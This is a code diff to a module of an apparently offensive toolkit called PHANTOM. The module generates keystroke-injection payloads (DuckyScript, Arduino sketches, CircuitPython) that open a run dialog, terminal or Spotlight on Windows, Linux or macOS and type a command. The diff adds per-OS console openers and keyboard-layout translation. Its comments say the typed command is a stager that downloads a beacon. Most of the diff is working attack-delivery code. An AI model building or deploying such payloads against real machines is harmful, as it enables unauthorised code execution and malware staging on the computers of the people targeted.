@@ -32,14 +32,33 @@ operator choices, and this module's job is to make that choice precise,
 warn about the mismatches it CAN see (a Windows Run-dialog keystroke on a
 Linux target) and never to guess.
 
+THE SECOND HALF OF "THE TARGET IS EXPLICIT" IS THE LAYOUT. A keystroke
+injector sends HID usage codes; the target OS turns those into characters
+with whatever layout it has active. Every table these boards ship
+(``Keyboard.print``, ``KeyboardLayoutUS``, DuckyScript ``STRING``) is US, so
+on an Italian target ``/`` and ``(`` — and ``{}``/``@``/``#`` behind AltGr —
+come out as the wrong character. ``--layout it`` pre-translates the command
+(``hid_layouts``) so the US codes sent are the ones an Italian keyboard maps
+back to what we meant, and types AltGr-only characters as explicit key
+combinations where the board can.
+
 Pure text generation: no I/O, no flashing, nothing writes a file here. The
 ``payload hid`` command writes what this returns.
 """
 
 from __future__ import annotations
 
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from typing import Optional, Sequence, Tuple
+
+from phantom.utils.hid_layouts import (
+    HID_LAYOUTS,
+    normalize_layout,
+    segments,
+    special_key_chars,
+    translate_text,
+    unsupported_chars,
+)
 
 BOARDS = ("pico", "flipper", "omg", "arduino")
 
@@ -55,8 +74,44 @@ DUCKYSCRIPT_BOARDS = ("flipper", "omg")
 # from.
 ARDUINO_BOARDS = ("arduino",)
 
-# the keystroke that opens a command prompt, per target family
-_RUN_DIALOG = {"windows": (("GUI", "R"), "run-dialog (Win+R)")}
+# How to open a place to type the command, per target family. The board is a
+# keyboard: it can only hit the chord that opens a console on EACH family, so
+# "universal" means "one chord per target", not "one chord for all". A step is
+# ("keys", names) — press these together and release; ("tap", name) — press and
+# release one key; ("text", s) — type a word.
+_OPENERS = {
+    "windows": (("keys", ("GUI", "R")),),
+    "linux": (("keys", ("CTRL", "ALT", "T")),),
+    "macos": (
+        ("keys", ("GUI", "SPACE")),
+        ("text", "terminal"),
+        ("tap", "ENTER"),
+    ),
+}
+
+_OPENER_LABELS = {
+    "windows": "run dialog (Win+R)",
+    "linux": "terminal (Ctrl+Alt+T, the GNOME-family shortcut)",
+    "macos": "Spotlight (Cmd+Space), typing 'terminal' to open the console",
+}
+
+# logical key name -> the token each generator prints
+_DUCKY_KEY = {
+    "GUI": "GUI", "CTRL": "CTRL", "ALT": "ALT", "SHIFT": "SHIFT",
+    "ENTER": "ENTER", "SPACE": "SPACE", "R": "R", "T": "T",
+}
+
+_ARDUINO_KEY = {
+    "GUI": "KEY_LEFT_GUI", "CTRL": "KEY_LEFT_CTRL", "ALT": "KEY_LEFT_ALT",
+    "SHIFT": "KEY_LEFT_SHIFT", "ENTER": "KEY_RETURN", "SPACE": "' '",
+    "R": "'r'", "T": "'t'",
+}
+
+_PICO_KEY = {
+    "GUI": "Keycode.GUI", "CTRL": "Keycode.CONTROL", "ALT": "Keycode.ALT",
+    "SHIFT": "Keycode.LEFT_SHIFT", "ENTER": "Keycode.ENTER",
+    "SPACE": "Keycode.SPACEBAR", "R": "Keycode.R", "T": "Keycode.T",
+}
 
 DEFAULT_DELAY_MS = 1500
 
@@ -76,6 +131,7 @@ class HidPayload:
     filename: str
     content: str
     target: str = ""
+    layout: str = "us"
     notes: Tuple[str, ...] = ()
 
     @property
@@ -86,31 +142,97 @@ class HidPayload:
         head = f"{self.board} HID payload -> {self.filename} ({self.lines} lines)"
         if self.target:
             head += f" for {self.target} targets"
+        if self.layout != "us":
+            head += f" ({self.layout} layout)"
         return " | ".join((head,) + tuple(self.notes))
 
 
+def _opener_gap(delay_ms: int) -> int:
+    return min(500, max(100, int(delay_ms) // 3))
+
+
+def _c_escape(text: str) -> str:
+    """Escape a string for a C literal: backslash then the closing quote."""
+    return text.replace("\\", "\\\\").replace('"', '\\"')
+
+
 def _duckyscript(command: str, *, delay_ms: int, press_enter: bool,
-                 open_run: bool, target: str) -> str:
+                 opener: Sequence[tuple], layout: str) -> str:
     lines = ["REM PHANTOM HID payload — types one command, then presses Enter",
              "REM flash/write this to the board; nothing executes on the "
              "operator box",
              f"DELAY {max(0, int(delay_ms))}"]
-    if open_run:
-        key = _RUN_DIALOG.get(target, (("GUI", "R"), ""))[0]
-        lines.append("REM open the run dialog: " + " + ".join(key))
-        lines.append("HOLD " + " ".join(key))
-        lines.append(f"DELAY {min(500, max(100, delay_ms // 3))}")
+    for step in opener:
+        kind = step[0]
+        if kind == "keys":
+            names = tuple(step[1])
+            lines.append("REM open: " + " + ".join(_DUCKY_KEY[n] for n in names))
+            lines.append("HOLD " + " ".join(_DUCKY_KEY[n] for n in names))
+            # RELEASE matters: HOLD leaves the modifiers down and the next
+            # STRING (or the typed command) would come out as shortcuts
+            lines.append("RELEASE")
+        elif kind == "tap":
+            lines.append(_DUCKY_KEY[step[1]])
+        elif kind == "text":
+            lines.append("STRING " + step[1])
+        lines.append(f"DELAY {_opener_gap(delay_ms)}")
     # STRING types the command verbatim; a leading SPACE would be typed too,
     # so the command is emitted on its own token
-    lines.append("STRING " + command)
+    lines.append("STRING " + translate_text(command, layout))
     if press_enter:
         lines.append("DELAY 200")
         lines.append("ENTER")
     return "\n".join(lines) + "\n"
 
 
+def _arduino_opener(opener: Sequence[tuple], delay_ms: int) -> list:
+    body = []
+    gap = _opener_gap(delay_ms)
+    for step in opener:
+        kind = step[0]
+        if kind == "keys":
+            body.append("  // open: " + " + ".join(step[1]))
+            for name in step[1]:
+                body.append(f"  Keyboard.press({_ARDUINO_KEY[name]});")
+            body.append("  Keyboard.releaseAll();")
+            body.append(f"  delay({gap});")
+        elif kind == "tap":
+            body.append(f"  Keyboard.press({_ARDUINO_KEY[step[1]]});")
+            body.append("  Keyboard.releaseAll();")
+            body.append(f"  delay({gap});")
+        elif kind == "text":
+            body.append(f'  Keyboard.print(F("{_c_escape(step[1])}"));')
+            body.append(f"  delay({gap});")
+    return body
+
+
+def _arduino_typing(command: str, layout: str) -> list:
+    body = []
+    if layout == "us":
+        body.append("  // the command, typed verbatim (F() keeps it in flash, "
+                    "not RAM)")
+        body.append(f'  Keyboard.print(F("{_c_escape(command)}"));')
+        return body
+    for segment in segments(command, layout):
+        if segment.kind == "print":
+            body.append(f'  Keyboard.print(F("{_c_escape(segment.text)}"));')
+            continue
+        mods = []
+        if segment.altgr:
+            mods.append("KEY_RIGHT_ALT")
+        if segment.shift:
+            mods.append("KEY_LEFT_SHIFT")
+        why = "AltGr" if segment.altgr else "non-US"
+        body.append(f"  // {why} key, HID usage 0x{segment.usage:02X}")
+        for mod in mods:
+            body.append(f"  Keyboard.press({mod});")
+        body.append(f"  Keyboard.press(0x{segment.usage:02X});")
+        body.append("  Keyboard.releaseAll();")
+    return body
+
+
 def _arduino_sketch(command: str, *, delay_ms: int, press_enter: bool,
-                    open_run: bool, target: str) -> str:
+                    opener: Sequence[tuple], layout: str) -> str:
     """An Arduino-IDE sketch for a RAM-constrained keystroke board.
 
     ``Keyboard.print`` reads the command from PROGMEM (``F(...)``), so an
@@ -118,31 +240,23 @@ def _arduino_sketch(command: str, *, delay_ms: int, press_enter: bool,
     has — it only has to fit in flash, which it does. This is why a 42 KB
     board is enough for the stager: the beacon is never on the board.
     """
-    # the command travels as a C string literal: backslash and the closing
-    # quote are the only characters that would end it early
-    literal = command.replace("\\", "\\\\").replace('"', '\\"')
     body = [
         "// PHANTOM HID payload — Arduino-IDE keystroke board (Keyboard.h).",
         "// Flash with the Arduino IDE: the board presents itself as a",
         "// keyboard and types ONE command, then presses Enter.",
+    ]
+    if layout != "us":
+        body.append(f"// target keyboard layout: {layout} (US codes "
+                    f"pre-translated)")
+    body += [
         "#include <Keyboard.h>",
         "",
         "void setup() {",
         f"  delay({max(0, int(delay_ms))});  // host enumerates the HID device",
         "  Keyboard.begin();",
     ]
-    if open_run:
-        body += [
-            "  // open the run dialog (Win+R)",
-            "  Keyboard.press(KEY_LEFT_GUI);",
-            "  Keyboard.press('r');",
-            "  Keyboard.releaseAll();",
-            f"  delay({min(500, max(100, delay_ms // 3))});",
-        ]
-    body += [
-        "  // the command, typed verbatim (F() keeps it in flash, not RAM)",
-        f'  Keyboard.print(F("{literal}"));',
-    ]
+    body += _arduino_opener(opener, delay_ms)
+    body += _arduino_typing(command, layout)
     if press_enter:
         body += [
             "  delay(200);",
@@ -158,11 +272,52 @@ def _arduino_sketch(command: str, *, delay_ms: int, press_enter: bool,
     return "\n".join(body)
 
 
+def _pico_opener(opener: Sequence[tuple], delay_ms: int) -> list:
+    body = []
+    gap = min(0.5, max(0.1, delay_ms / 3000.0))
+    for step in opener:
+        kind = step[0]
+        if kind == "keys":
+            names = ", ".join(_PICO_KEY[n] for n in step[1])
+            body.append("# open: " + " + ".join(step[1]))
+            body.append(f"kbd.press({names})")
+            body.append("kbd.release_all()")
+            body.append(f"time.sleep({gap:.2f})")
+        elif kind == "tap":
+            body.append(f"kbd.press({_PICO_KEY[step[1]]})")
+            body.append("kbd.release_all()")
+            body.append(f"time.sleep({gap:.2f})")
+        elif kind == "text":
+            body.append(f"layout.write({step[1]!r})")
+            body.append(f"time.sleep({gap:.2f})")
+    return body
+
+
+def _pico_typing(command: str, layout: str) -> list:
+    body = []
+    if layout == "us":
+        body.append("# the command, typed verbatim")
+        body.append(f"layout.write({command!r})")
+        return body
+    for segment in segments(command, layout):
+        if segment.kind == "print":
+            body.append(f"layout.write({segment.text!r})")
+            continue
+        args = []
+        if segment.altgr:
+            args.append("Keycode.RIGHT_ALT")
+        if segment.shift:
+            args.append("Keycode.LEFT_SHIFT")
+        args.append(f"0x{segment.usage:02X}")
+        why = "AltGr" if segment.altgr else "non-US"
+        body.append(f"# {why} key, HID usage 0x{segment.usage:02X}")
+        body.append("kbd.press(" + ", ".join(args) + ")")
+        body.append("kbd.release_all()")
+    return body
+
+
 def _circuitpython(command: str, *, delay_ms: int, press_enter: bool,
-                   open_run: bool, target: str) -> str:
-    key = _RUN_DIALOG.get(target, (("GUI", "R"), ""))[0]
-    run_press = ", ".join(f"Keycode.{part}" for part in key)
-    run_release = ", ".join(f"Keycode.{part}" for part in key)
+                   opener: Sequence[tuple], layout: str) -> str:
     body = [
         "# PHANTOM HID payload — RP2040 / Pico, CircuitPython.",
         "# Copy this file to the board as main.py (with the adafruit_hid",
@@ -180,21 +335,17 @@ def _circuitpython(command: str, *, delay_ms: int, press_enter: bool,
         f"time.sleep({max(0.1, delay_ms / 1000.0):.2f})  # host enumerates the HID device",
         "",
     ]
-    if open_run:
-        body += [
-            f"# open the run dialog ({' + '.join(key)})",
-            f"kbd.press({run_press})",
-            "kbd.release_all()",
-            f"time.sleep({min(0.5, max(0.1, delay_ms / 3000.0)):.2f})",
-            "",
-        ]
-    body += [
-        "# the command, typed verbatim",
-        f"layout.write({command!r})",
-        "",
-    ]
+    if layout != "us":
+        body.append(f"# target keyboard layout: {layout} (US codes "
+                    f"pre-translated)")
+        body.append("")
+    body += _pico_opener(opener, delay_ms)
+    if opener:
+        body.append("")
+    body += _pico_typing(command, layout)
     if press_enter:
         body += [
+            "",
             "time.sleep(0.2)",
             "kbd.press(Keycode.ENTER)",
             "kbd.release_all()",
@@ -205,18 +356,24 @@ def _circuitpython(command: str, *, delay_ms: int, press_enter: bool,
 
 def build_hid_payload(board: str, command: str, *,
                       target: str = "",
+                      layout: str = "us",
                       delay_ms: int = DEFAULT_DELAY_MS,
                       press_enter: bool = True,
                       open_run: bool = False) -> HidPayload:
     """Build the artefact for one board, or say why it cannot be built.
 
-    Raises ``ValueError`` on an unknown board or an empty command: a blank
-    HID payload is a bad flash, not a silent no-op.
+    ``layout`` is the layout the TARGET has active (``us``/``it``): the typed
+    command is pre-translated so the US scan codes these boards send come out
+    as the intended characters.
+
+    Raises ``ValueError`` on an unknown board, an unknown layout or an empty
+    command: a blank HID payload is a bad flash, not a silent no-op.
     """
     board = (board or "").strip().lower()
     if board not in BOARDS:
         raise ValueError(f"unknown HID board {board!r}: choose from "
                          f"{', '.join(BOARDS)}")
+    layout = normalize_layout(layout)
     command = (command or "").strip()
     # the operator quotes the command on the command line; a keystroke
     # injector would type those grouping quotes as part of the instruction
@@ -228,15 +385,22 @@ def build_hid_payload(board: str, command: str, *,
     target = (target or "").strip().lower()
 
     notes = []
+    opener: Tuple[tuple, ...] = ()
     if open_run:
-        if target == "windows":
-            notes.append("target windows: opens the run dialog (Win+R) first")
+        if target in _OPENERS:
+            opener = _OPENERS[target]
+            notes.append(f"target {target}: opens the "
+                         f"{_OPENER_LABELS[target]} before typing")
         elif target:
             notes.append(
-                f"target {target}: the run dialog is a WINDOWS keystroke — "
-                f"it is ignored on this target; type into a shell instead")
+                f"target {target}: no opener is known for it — open a shell "
+                f"on the target yourself, the board cannot guess the keystroke")
         else:
-            notes.append("run dialog assumed (no target given): Windows only")
+            # no target: fall back to the one opener that is on every Windows
+            # box, and SAY that is the assumption
+            opener = _OPENERS["windows"]
+            notes.append("no target given: assuming a Windows run dialog "
+                         "(Win+R); pass --target for the right opener")
     if (
         target == "windows"
         and command.lstrip().lower().startswith(("sh ", "bash ", "curl -sk"))
@@ -249,6 +413,24 @@ def build_hid_payload(board: str, command: str, *,
         notes.append("the typed command must match the TARGET os: nothing "
                      "here detects it (the board types into whatever it is "
                      "plugged into)")
+
+    if layout != "us":
+        missing = unsupported_chars(command, layout)
+        if missing:
+            notes.append(
+                f"layout {layout}: no key produces {''.join(missing)!r} — the "
+                f"board will type something else there; reword the command")
+        needs_keys = special_key_chars(command, layout)
+        if needs_keys and board in DUCKYSCRIPT_BOARDS:
+            notes.append(
+                f"layout {layout}: DuckyScript STRING cannot type "
+                f"{''.join(needs_keys)!r} (they need AltGr or a non-US key) — "
+                f"shorten or reword the command")
+        elif needs_keys:
+            notes.append(
+                f"layout {layout}: {''.join(needs_keys)!r} are typed as "
+                f"explicit AltGr / non-US key combinations")
+
     if len(command) > LONG_COMMAND_CHARS:
         notes.append(
             f"very long command ({len(command)} chars): a keystroke injector "
@@ -257,21 +439,21 @@ def build_hid_payload(board: str, command: str, *,
 
     if board in DUCKYSCRIPT_BOARDS:
         content = _duckyscript(command, delay_ms=delay_ms,
-                               press_enter=press_enter, open_run=open_run,
-                               target=target)
+                               press_enter=press_enter, opener=opener,
+                               layout=layout)
         filename = "phantom_hid.txt"
     elif board in ARDUINO_BOARDS:
         content = _arduino_sketch(command, delay_ms=delay_ms,
-                                  press_enter=press_enter, open_run=open_run,
-                                  target=target)
+                                  press_enter=press_enter, opener=opener,
+                                  layout=layout)
         filename = "phantom_hid.ino"
     else:
         content = _circuitpython(command, delay_ms=delay_ms,
-                                 press_enter=press_enter, open_run=open_run,
-                                 target=target)
+                                 press_enter=press_enter, opener=opener,
+                                 layout=layout)
         filename = "main.py"
     return HidPayload(board=board, filename=filename, content=content,
-                      target=target, notes=tuple(notes))
+                      target=target, layout=layout, notes=tuple(notes))
 
 
 def board_notes(board: str) -> Tuple[str, ...]:
@@ -289,8 +471,12 @@ def board_notes(board: str) -> Tuple[str, ...]:
         return ("paste the DuckyScript into the O.MG cable web UI and store "
                 "it on the device (the cable is the keyboard)",)
     if board in ARDUINO_BOARDS:
-        return ("open the .ino in the Arduino IDE (the folder must be named "
-                "phantom_hid) and upload it: the board is the keyboard",
+        return ("open the .ino in the Arduino IDE and upload it: the board "
+                "is the keyboard",
+                "the Arduino IDE refuses a sketch whose folder is not named "
+                "after the .ino file: keep them together, e.g. "
+                "arduino_phantom_hid/arduino_phantom_hid.ino (the default "
+                "output path already does this)",
                 "the payload is the TYPED COMMAND, not a file on the board — "
                 "a 42 KB flash board carries the stager fine because the "
                 "beacon is downloaded, never stored",
